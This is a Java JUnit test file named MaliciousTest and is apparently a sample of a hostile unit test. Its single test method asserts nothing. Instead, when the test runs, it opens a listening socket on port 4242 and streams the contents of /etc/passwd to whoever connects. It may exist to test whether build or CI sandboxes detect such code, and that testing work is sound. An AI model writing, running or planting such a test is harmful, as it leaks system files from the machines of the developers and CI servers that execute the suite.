
import org.junit.Test;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileReader;
import java.net.ServerSocket;
import java.net.Socket;

public class MaliciousTest {

    @Test
    public void test() throws Exception {
        ServerSocket s = new ServerSocket(4242);
        Socket socket = s.accept();
        BufferedReader in = new BufferedReader(new FileReader("/etc/passwd"));
        DataOutputStream out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));

        String line;
        while ((line = in.readLine()) != null) {
            out.writeChars(line);
            out.writeChar('\n');
        }

        out.flush();
        socket.close();
        s.close();
    }
}
